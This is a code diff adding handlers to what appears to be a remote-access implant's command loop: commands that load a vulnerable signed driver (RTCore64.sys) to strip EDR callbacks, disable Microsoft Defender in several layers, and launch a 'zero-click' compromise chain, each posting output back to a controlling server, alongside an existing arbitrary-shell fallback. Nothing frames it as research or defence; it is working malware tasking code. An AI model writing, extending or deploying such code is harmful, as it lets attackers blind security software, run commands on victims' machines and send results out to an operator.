@@ -2204,6 +2204,75 @@ $filter='(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=41
                     out = f"Scan error: {e}"
                 _post(f"/agent/result?id={AID}&cmd=EXPLOIT_SCAN", out)
 
+            # ── Kernel-level EDR / Defender elimination ──────────────────────
+            elif cmd == "BYOVD":
+                # BYOVD <driver_path>  — load signed driver, wipe EDR callbacks
+                parts = cmd.split(None, 1)
+                drv_path = parts[1] if len(parts) > 1 else None
+                try:
+                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
+                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
+                    import byovd as _byovd
+                    out = _byovd.run("remove_callbacks", driver_path=drv_path)
+                except ImportError:
+                    out = ("byovd module not loaded.\n"
+                           "Place RTCore64.sys at %TEMP%\\RTCore64.sys\n"
+                           "Extract from MSI Afterburner installer.")
+                except Exception as e:
+                    out = f"BYOVD error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=BYOVD", str(out)[:3000])
+
+            elif cmd == "KILL_DEFENDER":
+                # Full 6-layer Defender/EDR elimination stack
+                try:
+                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
+                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
+                    import defender_kill as _dk
+                    out = _dk.run("all")
+                except ImportError:
+                    out = "defender_kill module not available — check op/modules/"
+                except Exception as e:
+                    out = f"KILL_DEFENDER error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=KILL_DEFENDER", str(out)[:5000])
+
+            elif cmd and cmd.startswith("KILL_DEFENDER "):
+                # KILL_DEFENDER <layer>  — run single layer
+                layer = cmd.split(None, 1)[1].strip().lower()
+                try:
+                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
+                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
+                    import defender_kill as _dk
+                    out = _dk.run(layer)
+                except Exception as e:
+                    out = f"KILL_DEFENDER layer error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=KILL_DEFENDER", str(out)[:3000])
+
+            elif cmd == "ZERO_CLICK":
+                # Launch zero-interaction compromise chain (Linux/Mac)
+                try:
+                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
+                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
+                    import zero_click as _zc
+                    import socket as _sock
+                    attacker_ip = _sock.gethostbyname(_sock.gethostname())
+                    out = _zc.run("chain", attacker_ip=attacker_ip)
+                except Exception as e:
+                    out = f"ZERO_CLICK error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=ZERO_CLICK", str(out)[:3000])
+
+            elif cmd and cmd.startswith("ZERO_CLICK "):
+                # ZERO_CLICK <action> [args...]
+                parts = cmd.split(None, 1)
+                action = parts[1] if len(parts) > 1 else "chain"
+                try:
+                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
+                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
+                    import zero_click as _zc
+                    out = _zc.run(action)
+                except Exception as e:
+                    out = f"ZERO_CLICK error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=ZERO_CLICK", str(out)[:3000])
+
             elif cmd and cmd!="PING":
                 _post(f"/agent/result?id={AID}&cmd="+_parse.quote(cmd[:80]),_shell(cmd))
         except: pass
